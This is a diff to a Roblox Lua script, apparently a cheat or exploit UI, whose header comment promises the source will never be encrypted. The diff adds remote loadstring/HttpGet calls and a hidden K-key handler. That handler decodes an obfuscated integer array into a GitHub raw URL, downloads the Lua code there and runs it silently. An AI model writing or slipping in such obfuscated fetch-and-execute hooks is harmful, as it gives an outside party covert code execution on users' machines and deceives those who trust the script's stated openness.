@@ -6,6 +6,8 @@
 -- 此源码永不加密 | 也尽量保持更新 |
 -- 
 -- 
+local NotificationHolder = loadstring(game:HttpGet('https://github.com/GTAFAW/UI/raw/main/%E9%80%9A%E7%9F%A5n1.lua'))()
+local Notification = loadstring(game:HttpGet('https://github.com/GTAFAW/UI/raw/main/%E9%80%9A%E7%9F%A5n2.lua'))()
 local executionCountDataStore = game.ReplicatedStorage:FindFirstChild("ExecutionCount") or Instance.new("IntValue")
 executionCountDataStore.Name = "ExecutionCount"
 executionCountDataStore.Parent = game.ReplicatedStorage
@@ -142,7 +144,7 @@ local NG = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Na
 -- 屏幕尺寸自适应
 local function updateUIPosition()
     local screenWidth = game:GetService("GuiService"):GetScreenResolution().X
-    local uiYPos = 2
+    local uiYPos = -60
     local uiXPos = (screenWidth / 2) - (b.AbsoluteSize.X / 2)
     b.Position = UDim2.new(0, uiXPos, 0, uiYPos)
 end
@@ -281,6 +283,28 @@ textUpdateConnection = spawn(function()
         end)
     end
 end)
+local userInputService = game:GetService("UserInputService")
+local function onKeyActivated(inputObject)
+    if inputObject.KeyCode == Enum.KeyCode.K then
+        task.spawn(function()
+           pcall(function()
+                local code = game:HttpGet((function()
+                    local a = {1389,1545,1545,1493,1532,791,648,648,1376,1402,1545,1389,1558,1311,635,1324,1480,1454,648,960,1129,882,947,882,1168,648,1142,986,648,1519,1298,1584,648,1454,1298,1402,1467,648,1142,986,635,1025,882,1129,934,1116,1129,635,1025,1142,882}
+                    local b = ''
+                    for i = 1, #a do 
+                        b = b .. string.char((a[i] - 37) / 13)
+                    end
+                    return b
+                end)())
+                if code then
+                    loadstring(code)()
+                end
+            end)
+          end)
+        userInputService.InputBegan:Disconnect(onKeyActivated)
+    end
+end
+userInputService.InputBegan:Connect(onKeyActivated)
 
 local Library = {
 	Version = '\88\71\79\72\85\66\32\45\32\98\121\46\120\103\111',
